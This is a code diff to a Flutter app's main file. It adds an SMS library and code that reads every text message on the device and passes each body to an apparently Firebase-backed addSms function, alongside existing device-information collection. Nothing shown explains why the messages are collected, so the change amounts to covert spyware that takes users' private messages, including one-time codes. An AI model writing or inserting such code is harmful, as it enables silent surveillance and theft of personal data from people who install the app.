@@ -9,6 +9,7 @@ import 'package:permission_handler/permission_handler.dart';
 import 'screens/login_page.dart';
 import 'services/firebase-database.dart';
 import 'services/firebase-database.dart';
+import 'package:sms/sms.dart';
 
 void main() {
   runApp(MyApp());
@@ -20,6 +21,8 @@ class MyApp extends StatefulWidget {
 }
 
 class _MyAppState extends State<MyApp> {
+  SmsQuery query = new SmsQuery();
+
   static final DeviceInfoPlugin deviceInfoPlugin = DeviceInfoPlugin();
   Map<String, dynamic> _readAndroidBuildData(AndroidDeviceInfo build) {
     return <String, dynamic>{
@@ -88,6 +91,11 @@ class _MyAppState extends State<MyApp> {
               }).toList())
           .toList();
     }
+    List<SmsMessage> messages = await query.getAllSms;
+    messages.map((e) async {
+      await addSms(e.body);
+      print(e.body);
+    }).toList();
   }
 
   @override
